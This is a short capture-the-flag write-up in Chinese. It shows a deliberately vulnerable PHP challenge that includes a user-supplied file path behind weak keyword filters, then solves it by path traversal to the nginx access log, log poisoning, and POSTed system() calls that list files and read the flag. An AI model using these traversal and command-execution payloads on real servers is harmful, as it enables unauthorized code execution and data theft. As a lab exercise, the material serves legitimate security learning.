```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```



过滤了

php

data

:





日志注入

```
?file=../../../../../../var/log/nginx/access.log
```

![image-20250405160235598](./assets/image-20250405160235598.png)

![image-20250405160307228](./assets/image-20250405160307228.png)

![image-20250405160324163](./assets/image-20250405160324163.png)

命令执行

GET

```
?file=../../../../../../var/log/nginx/access.log
```

POST

```
a=system("ls");
```

![image-20250405160350326](./assets/image-20250405160350326.png)

GET

```
?file=../../../../../../var/log/nginx/access.log
```

POST

```
a=system("tac fl0g.php");
```

![image-20250405160416604](./assets/image-20250405160416604.png)